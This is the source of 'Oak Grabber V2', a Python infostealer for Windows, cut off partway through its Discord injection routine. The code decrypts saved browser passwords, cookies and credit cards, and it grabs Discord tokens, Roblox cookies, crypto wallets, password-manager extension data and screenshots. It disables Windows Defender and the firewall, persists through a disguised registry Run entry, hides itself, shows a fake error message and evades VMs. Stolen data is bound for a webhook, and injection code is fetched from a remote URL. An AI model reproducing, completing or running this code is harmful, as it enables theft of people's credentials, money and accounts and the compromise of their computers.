import ctypes
import time
import sqlite3
import datetime
import base64
import winreg
import os
import sys
import uuid
import re
import psutil
import struct
import json
import threading
import subprocess
import asyncio
import traceback
import zipfile

import requests
import shutil
import random
import ntpath

from threading     import Thread
from PIL           import ImageGrab
from Crypto.Cipher import AES
from win32crypt    import CryptUnprotectData
from tempfile      import gettempdir, mkdtemp
from sys           import argv

config = {
    'webhook': 'webhook_here',
    'Ping_on_run': True,
    'Add_to_startup': True,
    'Self_hide': True,
    'Hide_Console': True,
    'Disable_defender': True,
    'inject': True,
    'injection_url': 'https://raw.githubusercontent.com/j0taro/Oak-injection/main/Oak.js',
    'Black_Screen': True,
    'Fake_error_message': True,
    'Antivm': True,
    'Error_message': 'The image file C:\WINDOWS\SYSTEM32\XINPUT1_3.dll is valid, but is for a machine type other than the current machine. Select OK to continue, or CANCEL to fail the DLL load.',
}


class functions(object):

    def getHeaders(self, token: str = None, content_type="application/json") -> dict:
        headers = {"Content-Type": content_type,
                   "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
        if token:
            headers.update({"Authorization": token})
        return headers

    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def create_temp_file(_dir: str or os.PathLike = gettempdir()):
        fn = ''.join(random.SystemRandom().choice(
            'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
        path = ntpath.join(_dir, fn)
        open(path, "x")
        return path

    def file_tree(self, path):
        ret = ""
        fc = 0
        space = '  '
        last = "└ "
        file = "📄"
        branch = "│ "
        for dirpath, dirnames, filenames in os.walk(path):
            folder = dirpath.replace(path, "")
            folder = folder.count(os.sep)
            ret += f"\n{space*folder}📁 {os.path.basename(dirpath)}"
            for n, f in enumerate(filenames):
                if os.path.isfile(dirpath+f"\\{f}"):
                    size = os.path.getsize(dirpath+f"\\{f}")/1024
                else:
                    total = 0
                    with os.scandir(dirpath+f"\\{f}") as it:
                        for entry in it:
                            if entry.is_file():
                                total += entry.stat().st_size
                                size = total/1024
                if size > 1024:
                    size = "{:.1f} MB".format(size/1024)
                else:
                    size = "{:.1f} KB".format(size)
                if f == f'OakGrabber-{os.getlogin()}.zip':
                    continue
                indent2 = branch if n != len(filenames) - 1 else last
                ret += f"\n{space*(folder)}{indent2}{f} - {file} ({size})"
                fc += 1
        return ret, fc

    def sys(self, action):
        return '\n'.join(line for line in subprocess.check_output(action, creationflags=0x08000000, shell=True).decode().strip().splitlines() if line.strip())

    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return f'Failed to decrypt "{str(buff)}" | Key: "{str(master_key)}"'


class oakgrabberV2(functions):
    def __init__(self):
        self.webhook = config.get('webhook')
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.name = os.getlogin()
        self.chrome_user_data = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')
        self.dir, self.temp = mkdtemp(), gettempdir()
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.tokens = []
        self.exceptions = []
        self.robloxcookies = []
        os.makedirs(self.dir, exist_ok=True)
        self.browserpaths = {
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable',
            'Edge': self.appdata + r'\\Microsoft\\Edge\\User Data',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data',
            'Amigo': self.appdata + r'\\Amigo\\User Data',
            'Torch': self.appdata + r'\\Torch\\User Data',
            'Kometa': self.appdata + r'\\Kometa\\User Data',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data',
            'Chrome Beta': self.appdata + r'\\Google\\Chrome Beta\\User Data',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data',
            'Iridium': self.appdata + r'\\Iridium\\User Data',
            'Chromium': self.appdata + r'\\Chromium\\User Data'
        }
        self.stats = {
            'passwords': 0,
            'tokens': 0,
            'phones': 0,
            'addresses': 0,
            'cards': 0,
            'cookies': 0,
            'bookmarks': 0,
            'roblox cookies': 0,
            'wallets': 0,
            'passman': 0,
            'extentions': 0
        }

    def exit(self):
        shutil.rmtree(self.dir, ignore_errors=True)
        os._exit(0)

    def checkToken(self, tkn):
        try:
            if not tkn in self.tokens:
                r = requests.get(self.baseurl, headers=self.getHeaders(tkn))
                if r.status_code == 200 and tkn not in [token[0] for token in self.tokens]:
                    self.tokens.append((tkn))
                    self.stats['tokens'] += 1
        except Exception:
            self.exceptions.append(traceback.format_exc())

    def bypassBetterDiscord(self):
        betterdc = self.roaming+"\\BetterDiscord\\data\\betterdiscord.asar"
        if os.path.exists(betterdc):
            with open(betterdc, 'r', encoding="utf8", errors='ignore') as f:
                txt = f.read()
                content = txt.replace('api/webhooks', 'api/nethooks')
            with open(betterdc, 'w', newline='', encoding="utf8", errors='ignore') as f:
                f.write(content)

    async def init(self):
        if self.webhook == "" or self.webhook == "webhook_here":
            self.exit()
        if config.get('Antivm') and AntiDebug().inVM:
            self.exit()
        if config.get('Black_Screen'):
            self.sys('start ms-cxh-full://0')
        if config.get('Hide_Console'):
            Thread(target=self.console).start()
        threads = [Thread(target=self.screenshot), Thread(target=self.grabMinecraftCache), Thread(target=self.steam), Thread(
            target=self.grabWallets), Thread(target=self.token), Thread(target=self.grabwifi), Thread(target=self.sysinfo), Thread(target=self.epicgames)]
        for plt, pth in self.browserpaths.items():
            threads.append(Thread(target=self.browserinfo, args=(plt, pth)))
        Thread(target=self.grabRobloxCookie).start()
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        if config.get('Self_hide'):
            Thread(target=self.hide).start()
        if config.get('Disable_defender'):
            Thread(target=self.defender).start()
        if config.get('Add_to_startup'):
            Thread(target=self.startup).start()
        if config.get('Fake_error_message'):
            Thread(target=self.error).start()
        if self.exceptions:
            with open(self.dir+'\\Exceptions.txt', 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.exceptions))
        self.upload()

    def error(self):
        Thread(target=ctypes.windll.user32.MessageBoxW, args=(0, config.get(
            'Error_message'), os.path.basename(sys.argv[0]), 0x1 | 0x10)).start()

    def hide(self):
        ctypes.windll.kernel32.SetFileAttributesW(argv[0], 2)

    def defender(self):
        subprocess.run("powershell Set-MpPreference -DisableRealtimeMonitoring $true -DisableArchiveScanning $true -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled && netsh Advfirewall set allprofiles state off",
                       shell=True, capture_output=True)

    def console(self):
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def startup(self):
        try:
            try:
                shutil.rmtree(os.path.join(self.roaming, 'Cursors'))
            except Exception:
                self.exceptions.append(traceback.format_exc())
                pass
            os.makedirs(self.roaming+'\\Cursors', exist_ok=True)
            ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors')
            ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors')
            ctypes.windll.kernel32.SetFileAttributesW(self.roaming+'\\Cursors')
            shutil.copy2(sys.argv[0], os.path.join(self.roaming, 'Cursors\\'))
            os.rename(os.path.join(self.roaming, 'Cursors\\', os.path.basename(
                sys.argv[0])), os.path.join(self.roaming, 'Cursors\\cursors.cfg',))
            binp = "Cursors\\cursors.cfg"
            initp = "Cursors\\cursorinit.vbs"
            with open(os.path.join(self.roaming, 'Cursors\\cursorinit.vbs'), 'w') as f:
                f.write(
                    f'\' This script loads the cursor configuration\n\' And cursors themselves\n\' Into the shell so that Fondrvhost.exe (The font renderer)\n\' Can use them.\n\' It is recommended not to tamper with\n\' Any files in this directory\n\' Doing so may cause the explorer to crash\nSet objShell = WScript.CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c \'{os.path.join(self.roaming,binp)}\'\", 0, True\n')
            self.sys(
                f'REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "CursorInit" /t REG_SZ /d "{os.path.join(self.roaming,initp)}" /f >nul')
        except Exception:
            try:
                shutil.copy2(sys.argv[0], ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'))
            except:
                pass
            self.exceptions.append(traceback.format_exc())

    def browserinfo(self, platform, path):
        p_header = f"Oak Grabber V2 Passwords\nBrowser:{platform}\n\n"
        c_header = f"Oak Grabber V2 Cookies\nBrowser:{platform}\n\n\n"
        h_header = f"Oak Grabber V2 History\nBrowser:{platform}\n\n"
        m_header = f"Oak Grabber V2 Other Info\nBrowser:{platform}\n\n"
        b_header = f"Oak Grabber V2 Bookmarks\nBrowser:{platform}\n\n"
        e_header = f"Oak Grabber V2 Extensions\nBrowser:{platform}\n\n"
        d_header = f"Oak Grabber V2 Download History\nBrowser:{platform}\n\n"
        if os.path.exists(path):
            self.passwords_temp = self.cookies_temp = self.history_temp = self.misc_temp = self.cookies_temp = self.down_temp = self.bookmarks_temp = self.ext_temp = ''
            def fname(x): return f'\\{platform} Info ({x}).txt'
            profiles = ['Default']
            for dir in os.listdir(path):
                if dir.startswith('Profile '):
                    profiles.append(dir)
            if platform in [
                'Opera',
                'Opera GX',
                'Amigo',
                'Torch',
                'Kometa',
                'Orbitum',
                'CentBrowser',
                '7Star',
                'Sputnik',
                'Chrome SxS',
                'Epic Privacy Browser',
            ]:
                cpath = path + '\\Network\\Cookies'
                ppath = path + '\\Login Data'
                hpath = path + '\\History'
                bpath = path + '\\Bookmarks'
                epath = path + '\\Extensions'
                wpath = path + '\\Web Data'
                mkpath = path + '\\Local State'
                ewpath = path + '\\Local Extension Settings'
                threads = [
                    Thread(target=self.grabPasswords, args=[
                           mkpath, platform, 'Default', ppath]),
                    Thread(target=self.grabCookies, args=[
                           mkpath, platform, 'Default', cpath]),
                    Thread(target=self.grabHistory, args=[
                           mkpath, platform, 'Default', hpath]),
                    Thread(target=self.grabMisc, args=[
                           mkpath, platform, 'Default', wpath]),
                    Thread(target=self.grabBookmarks, args=[
                           mkpath, platform, 'Default', bpath]),
                    Thread(target=self.grabextwallets, args=[
                           mkpath, platform, 'Default', ewpath]),
                    Thread(target=self.grabext, args=[
                           mkpath, platform, 'Default', epath])
                ]
                for x in threads:
                    x.start()
                for x in threads:
                    x.join()
            else:
                for profile in profiles:
                    cpath = path + f'\\{profile}\\Network\\Cookies'
                    ppath = path + f'\\{profile}\\Login Data'
                    hpath = path + f'\\{profile}\\History'
                    wpath = path + f'\\{profile}\\Web Data'
                    bpath = path + f'\\{profile}\\Bookmarks'
                    epath = path + f'\\{profile}\\Extensions'
                    ewpath = path + f'\\{profile}\\Local Extension Settings'
                    mkpath = path + '\\Local State'
                    threads = [
                        Thread(target=self.grabPasswords, args=[
                               mkpath, platform, profile, ppath]),
                        Thread(target=self.grabCookies, args=[
                               mkpath, platform, profile, cpath]),
                        Thread(target=self.grabHistory, args=[
                               mkpath, platform, profile, hpath]),
                        Thread(target=self.grabMisc, args=[
                               mkpath, platform, profile, wpath]),
                        Thread(target=self.grabBookmarks, args=[
                               mkpath, platform, profile, bpath]),
                        Thread(target=self.grabextwallets, args=[
                               mkpath, platform, profile, ewpath]),
                        Thread(target=self.grabext, args=[
                               mkpath, platform, profile, epath])
                    ]
                    for x in threads:
                        x.start()
                    for x in threads:
                        x.join()
            try:
                try:
                    os.mkdir(self.dir+f"\\{platform} ({profile})")
                except:
                    profile = "Default"
                    os.mkdir(self.dir+f"\\{platform} ({profile})")
                if self.cookies_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} Cookies ({profile}).txt', "w", encoding="utf8", errors='ignore') as m:
                        m.write(c_header)
                        m.write(self.cookies_temp)
                        m.close()
                else:
                    pass
                if self.down_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} Download History ({profile}).txt', "w", encoding="utf8", errors='ignore') as m:
                        m.write(d_header)
                        m.write(self.down_temp)
                        m.close()
                else:
                    pass
                if self.ext_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} Extensions ({profile}).txt', "w", encoding="utf8", errors='ignore') as m:
                        m.write(e_header)
                        m.write(self.ext_temp)
                        m.close()
                else:
                    pass
                if self.passwords_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} Passwords ({profile}).txt', "w", encoding="utf8", errors='ignore') as m:
                        m.write(p_header)
                        m.write(self.passwords_temp)
                        m.close()
                else:
                    pass
                if self.bookmarks_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} Bookmarks ({profile}).txt', "w", encoding="utf8", errors='ignore') as m:
                        m.write(b_header)
                        m.write(self.bookmarks_temp)
                        m.close()
                else:
                    pass
                if self.history_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} History ({profile}).txt', "w", encoding="utf8", errors='ignore') as m:
                        m.write(h_header)
                        m.write(self.history_temp)
                        m.close()
                else:
                    pass
                if self.misc_temp:
                    with open(self.dir+f'\\{platform} ({profile})\\{platform} Other Info ({profile}).txt', "w", encoding="utf8", errors='ignore')as m:
                        m.write(m_header)
                        m.write(self.misc_temp)
                        m.close()
                else:
                    pass
            except Exception:
                self.exceptions.append(traceback.format_exc())
                if os.path.exists(self.dir+f"\\{platform} ({profile})"):
                    os.rmdir(self.dir+f"\\{platform} ({profile})")

    def grabextwallets(self, mkpath, platform, profile, ewpath):
        self.passmanager = {
            "Authenticator": "bhghoamapcdpbohphigoooaddinpkbai",
            "EOS Authenticator": "oeljdldpnmdbchonielidgobddffflal",
            "Bitwarden": "nngceckbapebfimnlniiiahkandclblb",
            "KeePassXC": "oboonakemofpalcgghocfoadofidjkkk",
            "Dashlane": "fdjamakpfbbddfjaooikfcpapjohcfmg",
            "1Password": "aeblfdkhhhdcdjpifhhbdiojplfjncoa",
            "NordPass": "fooolghllnmhmmndgjiamiiodkpenpbb",
            "Keeper": "bfogiafebfohielmmehodmfbbebbbpei",
            "RoboForm": "pnlccmojcmeohlpggmfnbbiapkmbliob",
            "LastPass": "hdokiejnpimakedhajhdlcegeplioahd",
            "BrowserPass": "naepdomgkenhinolocfifgehidddafch",
            "MYKI": "bmikpgodpkclnkgmnpphehdgcimmided",
            "Splikity": "jhfjfclepacoldmjmkmdlmganfaalklb",
            "CommonKey": "chgfefjpcobfbnpmiokfjjaglahmnded",
            "Zoho Vault": "igkpcodhieompeloncfnbekccinhapdb",
            "Norton Password Manager": "admmjipmmciaobhojoghlmleefbicajg",
            "Avira Password Manager": "caljgklbbfbcjjanaijlacgncafpegll",
            "Trezor Password Manager": "imloifkgjagghnncjkhggdhalmcnfklk"
        }
        self.extwallets = {
            "MetaMask": "nkbihfbeogaeaoehlefnkodbefgpgknn",
            "TronLink": "ibnejdfjmmkpcnlpebklmnkoeoihofec",
            "BinanceChain": "fhbohimaelbohpjbbldcngcnapndodjp",
            "Coin98": "aeachknmefphepccionboohckonoeemg",
            "iWallet": "kncchdigobghenbbaddojjnnaogfppfj",
            "Wombat": "amkmjjmmflddogmhpjloimipbofnfjih",
            "MEW CX": "nlbmnnijcnlegkjjpcfjclmcfggfefdm",
            "NeoLine": "cphhlgmgameodnhkjdmkpanlelnlohao",
            "Terra Station": "aiifbnbfobpmeekipheeijimdpnlpgpp",
            "Keplr": "dmkamcknogkgcdfhhbddcghachkejeap",
            "Sollet": "fhmfendgdocmcbmfikdcogofphimnkno",
            "ICONex": "flpiciilemghbmfalicajoolhkkenfel",
            "KHC": "hcflpincpppdclinealmandijcmnkbgn",
            "TezBox": "mnfifefkajgofkcjkemidiaecocnkjeh",
            "Byone": "nlgbhdfgdhgbiamfdfmbikcdghidoadd",
            "OneKey": "infeboajgfhgbjpjbeppbkgnabfdkdaf",
            "DAppPlay": "lodccjjbdhfakaekdiahmedfbieldgik",
            "BitClip": "ijmpgkjfkbfhoebgogflfebnmejmfbml",
            "Steem Keychain": "lkcjlnjfpbikmcmbachjpdbijejflpcm",
            "Nash Extension": "onofpnbbkehpmmoabgpcpmigafmmnjhl",
            "Hycon Lite Client": "bcopgchhojmggmffilplmbdicgaihlkp",
            "ZilPay": "klnaejjgbibmhlephnhpmaofohgkpgkd",
            "Leaf Wallet": "cihmoadaighcejopammfbmddcmdekcje",
            "Cyano Wallet": "dkdedlpgdmmkkfjabffeganieamfklkm",
            "Cyano Wallet Pro": "icmkfkmjoklfhlfdkkkgpnpldkgdmhoe",
            "Nabox Wallet": "nknhiehlklippafakaeklbeglecifhad",
            "Polymesh Wallet": "jojhfeoedkpkglbfimdfabpdfjaoolaf",
            "Nifty Wallet": "jbdaocneiiinmjbjlgalhcelgbejmnid",
            "Liquality Wallet": "kpfopkelmapcoipemfendmdcghnegimn",
            "Math Wallet": "afbcbjpbpfadlkmhmclhkeeodmamcflc",
            "Coinbase Wallet": "hnfanknocfeofbddgcijnmhnfnkdnaad",
            "Clover Wallet": "nhnkbkgjikgcigadomkphalanndcapjk",
            "Yoroi": "ffnbelfdoeiohenkjibnmadjiehjhajb",
            "Guarda": "hpglfhgfnhbgpjdenjgmdgoeiappafln",
            "EQUAL Wallet": "blnieiiffboillknjnepogjhkgnoapac",
            "BitApp Wallet": "fihkakfobkmkjojpchpfgcmhfjnmnfpi",
            "Auro Wallet": "cnmamaachppnkjgnildpdmkaakejnhae",
            "Saturn Wallet": "nkddgncdjgjfcddamfgcmfnlhccnimig",
            "Ronin Wallet": "fnjhmkhhmkbjkkabndcnnogagogbneec"
        }
        for source, fr in self.extwallets.items():
            path = os.path.join(mkpath, platform, profile, ewpath, fr)
            if os.path.exists(str(path)):
                shutil.copytree(
                    path, self.dir+f"\\Wallets\\{source} - {platform} - Extention")
                self.stats['wallets'] += 1
        for source, fr in self.passmanager.items():
            path = os.path.join(mkpath, platform, profile, ewpath, fr)
            if os.path.exists(str(path)):
                shutil.copytree(
                    path, self.dir+f"\\Password Managers\\{source} - {platform} - Extention")
                self.stats['passman'] += 1 #pass man frrrrrrrrrrrr

    def grabPasswords(self, mkp, bname, pname, data):
        newdb = os.path.join(
            self.dir, f'{bname}_{pname}_PASSWORDS.db'.replace(' ', '_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try:
            shutil.copy2(login_db, newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute(
                "SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_val(
                    encrypted_password, master_key)
                if decrypted_password != "":
                    self.passwords_temp += f"\nDomain: {url}\nUser: {username}\nPass: {decrypted_password}\n"
                    self.stats['passwords'] += 1
        except Exception:
            self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try:
            os.remove(newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())

    def grabext(self, mkpath, platform, profile, epath):
        self.ext_temp = ''
        path = os.path.join(mkpath, platform, profile, epath)
        for x in os.listdir(path):
            if x != "Temp":
                pathe = os.path.join(mkpath, platform, profile, epath, x)
                for e in os.listdir(pathe):
                    pathe = os.path.join(
                        mkpath, platform, profile, epath, x, e)
                    for f in os.listdir(pathe):
                        if f == "manifest.json":
                            with open(pathe+f"\\{f}", encoding='utf-8') as json_file:
                                data = json.load(json_file)
                                for i in data:
                                    if data['name'] not in self.ext_temp:
                                        if not data['name'].startswith('__'):
                                            self.ext_temp += f"Name: {data['name']}\n"
                                            self.ext_temp += f"key: {data['key']}\n\n"
                                            self.stats['extentions'] += 1

    def grabCookies(self, mkp, bname, pname, data):
        self.cookies_temp = ''
        newdb = os.path.join(
            self.dir, f'{bname}_{pname}_COOKIES.db'.replace(' ', '_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try:
            shutil.copy2(login_db, newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute(
                "SELECT host_key, name, encrypted_value FROM cookies")
            for r in cursor.fetchall():
                host = r[0]
                user = r[1]
                cookie = self.decrypt_val(r[2], master_key)
                if host != "":
                    self.cookies_temp += f"Host: {host}\nUser: {user}\nCookie: {cookie}\n\n"
                    self.stats['cookies'] += 1
                if '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in cookie:
                    self.robloxcookies.append(cookie)
                    self.stats['roblox cookies'] += 1
        except Exception:
            self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try:
            os.remove(newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())

    def grabBookmarks(self, mkpath, platform, profile, bpath):
        self.bookmarks_temp = ''
        num = 0
        num2 = 0
        num3 = 0
        path = os.path.join(mkpath, platform, profile, bpath)
        with open(path, encoding='utf-8') as json_file:
            data = json.load(json_file)
            for i in data['roots']['bookmark_bar']['children']:
                try:
                    name = (data['roots']['bookmark_bar']
                            ['children'][num]['name'])
                    type = (data['roots']['bookmark_bar']
                            ['children'][num]['type'])
                    try:
                        url = (data['roots']['bookmark_bar']
                               ['children'][num]['url'])
                    except:
                        url = "Error"
                    num += 1
                    self.stats['bookmarks'] += 1
                    self.bookmarks_temp += (
                        f"Name: {name}\nType: {type}\nUrl: {url}\n\n")
                except:
                    pass
            for i in data['roots']['other']['children']:
                try:
                    name = (data['roots']['other']['children'][num2]['name'])
                    type = (data['roots']['other']['children'][num2]['type'])
                    try:
                        url = (data['roots']['other']['children'][num2]['url'])
                    except:
                        url = "Error"
                    num2 += 1
                    self.stats['bookmarks'] += 1
                    self.bookmarks_temp += (
                        f"Name: {name}\nType: {type}\nUrl: {url}\n\n")
                except:
                    pass
            for i in data['roots']['synced']['children']:
                try:
                    name = (data['roots']['synced']['children'][num3]['name'])
                    type = (data['roots']['synced']['children'][num3]['type'])
                    try:
                        url = (data['roots']['synced']
                               ['children'][num3]['url'])
                    except:
                        url = "Error"
                    num3 += 1
                    self.stats['bookmarks'] += 1
                    self.bookmarks_temp += (
                        f"Name: {name}\nType: {type}\nUrl: {url}\n\n")
                except:
                    pass

    def grabHistory(self, mkp, bname, pname, data):
        self.history_temp = ''
        self.down_temp = ''
        newdb = os.path.join(
            self.dir, f'{bname}_{pname}_HISTORY.db'.replace(' ', '_'))
        login_db = data
        try:
            shutil.copy2(login_db, newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute(
                "SELECT url, title, visit_count, typed_count, last_visit_time FROM 'urls' ORDER BY last_visit_time DESC")
            for r in cursor.fetchall()[::-1]:
                url = r[0]
                title = r[1]
                count = r[2]
                tcount = r[3]
                time = r[4]
                time_neat = str(datetime.datetime(
                    1601, 1, 1) + datetime.timedelta(microseconds=time))[:-7].replace('-', '/')
                if url != "":
                    self.history_temp += f"\nURL: {url}\nTitle: {title}\nVisit Count: {count}\nTyped Count: {tcount}\nLast Visited: {time_neat}\n"
        except Exception:
            self.exceptions.append(traceback.format_exc())
        try:
            cursor.execute(
                "SELECT current_path, total_bytes, danger_type, tab_url, end_time, original_mime_type, state, opened FROM 'downloads' ORDER BY start_time DESC")
            for r in cursor.fetchall():
                current_path = r[0]
                total_bytes = r[1]
                danger_type = str(r[2])
                tab_url = r[3]
                end_time = r[4]
                original_mime_type = r[5]
                state = str(r[6])
                opened = r[7]
                opened = bool(opened)
                if state == "-1": 
                    state = "Invalid"
                elif state == "0":
                    state = "In progress"
                elif state == "1":
                    state = "Complete"
                elif state == "2":
                    state = "Cancelled"
                elif state == "3":
                    state = "Bug 140687"
                elif state == "4":
                    state = "Interrupted"
                else:
                    state = "Unknown"
                if danger_type == "-1":
                    danger_type = "Invalid"
                elif danger_type == "0":
                    danger_type = "Safe"
                elif danger_type == "1":
                    danger_type = "Dangerous file"
                elif danger_type == "2":
                    danger_type = "Dangerous URL"
                elif danger_type == "3":
                    danger_type = "Dangerous content"
                elif danger_type == "4":
                    danger_type = "Possibly dangerous content"
                elif danger_type == "5":
                    danger_type = "Uncommon content"
                elif danger_type == "6":
                    danger_type = "User allowed file"
                elif danger_type == "7":
                    danger_type = "Dangerous host"
                elif danger_type == "8":
                    danger_type = "Potentially unwanted file"
                else:
                    danger_type = "Unknown"
                self.down_temp += f"\nCurrent Path: {current_path}\nSize: {total_bytes}\nDanger Type: {danger_type}\nUrl: {tab_url}\nEnd Time: {end_time}\nType: {original_mime_type}\nState: {state}\nOpened: {opened}\n "
        except Exception:
            self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try:
            os.remove(newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())

    def grabMisc(self, mkp, bname, pname, data):
        self.misc_temp = ''
        newdb = os.path.join(
            self.dir, f'{bname}_{pname}_WEBDATA.db'.replace(' ', '_'))
        master_key = self.get_master_key(mkp)
        login_db = data
        try:
            shutil.copy2(login_db, newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())
        conn = sqlite3.connect(newdb)
        cursor = conn.cursor()
        try:
            cursor.execute(
                "SELECT street_address, city, state, zipcode FROM autofill_profiles")
            for r in cursor.fetchall():
                Address = r[0]
                City = r[1]
                State = r[2]
                ZIP = r[3]
                if Address != "":
                    self.misc_temp += f"\nAddress: {Address}\nCity: {City}\nState: {State}\nZIP Code: {ZIP}\n"
                    self.stats['addresses'] += 1
            cursor.execute("SELECT number FROM autofill_profile_phones")
            for r in cursor.fetchall():
                Number = r[0]
                if Number != "":
                    self.misc_temp += f"\nPhone Number: {Number}\n"
                    self.stats['phones'] += 1
            cursor.execute(
                "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
            for r in cursor.fetchall():
                Name = r[0]
                ExpM = r[1]
                ExpY = r[2]
                decrypted_card = self.decrypt_val(r[3], master_key)
                if decrypted_card != "":
                    self.misc_temp += f"\nCard Number: {decrypted_card}\nName on Card: {Name}\nExpiration Month: {ExpM}\nExpiration Year: {ExpY}\n"
                    self.stats['cards'] += 1
        except Exception:
            self.exceptions.append(traceback.format_exc())
        cursor.close()
        conn.close()
        try:
            os.remove(newdb)
        except Exception:
            self.exceptions.append(traceback.format_exc())

    def grabRobloxCookie(self):
        try:
            self.robloxcookies.append(self.sys(
                r"powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com' -Name .ROBLOSECURITY"))
        except Exception:
            pass
        if self.robloxcookies:
            with open(self.dir+"\\Roblox Cookies.txt", "w") as f:
                for i in self.robloxcookies:
                    f.write(i+'\n')
                    self.stats['roblox cookies'] += 1

    def grabWallets(self):
        self.walletspath = {
            "Zcash": f"{self.roaming}\\Zcash",
            "Armory": f"{self.roaming}\\Armory",
            "Ethereum": f"{self.roaming}\\Ethereum\\keystore",
            "Atomic Wallet": f"{self.roaming}\\atomic\\Local Storage\\leveldb",
            "Coinomi": f"{self.roaming}\\Coinomi\\Coinomi\\wallets",
            "Guarda": f"{self.roaming}\\Guarda\\Local Storage\\leveldb",
            "Exodus": f"{self.roaming}\\exodus\\exodus.wallet\\",
            "JaxxWallet": f"{self.roaming}\\Wallets\\Jaxx\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb\\",
            "Electrum": f"{self.roaming}\\Electrum\\wallets\\",
            "ByteCoin": f"{self.roaming}\\bytecoin\\",
        }
        for source, path in self.walletspath.items():
            if os.path.exists(str(path)):
                shutil.copytree(path, self.dir+f"//Wallets//{source}")
                self.stats['wallets'] += 1

    def screenshot(self):
        image = ImageGrab.grab(
            bbox=None,
            include_layered_windows=False,
            all_screens=True,
            xdisplay=None
        )
        image.save(self.dir + "\\Screenshot.png")
        image.close()

    def steam(self):
        path = "C:\Program Files (x86)\Steam"
        if os.path.exists(path):
            os.mkdir(self.dir+"\\Steam")
            for fr in os.listdir(path):
                if fr.startswith("ssfn"):
                    shutil.copy2(path+f"\\{fr}", self.dir+"\\Steam")

    def injector(self):
        self.bypassBetterDiscord()
        for dir in os.listdir(self.appdata):
            if 'discord' in dir.lower():
                discord = self.appdata+f'\\{dir}'
                disc_sep = discord+'\\'
                for _dir in os.listdir(os.path.abspath(discord)):
                    if re.match(r'app-(\d*\.\d*)*', _dir):
                        app = os.path.abspath(disc_sep+_dir)
                        for x in os.listdir(os.path.join(app, 'modules')):
                            if x.startswith('discord_desktop_core-'):
                                inj_path = app + \
                                    f'\\modules\\{x}\\discord_desktop_core\\'
                                if os.path.exists(inj_path):
                                    f = requests.get(config.get('injection_url')).text.replace(
                                        "%WEBHOOK%", self.webhook)
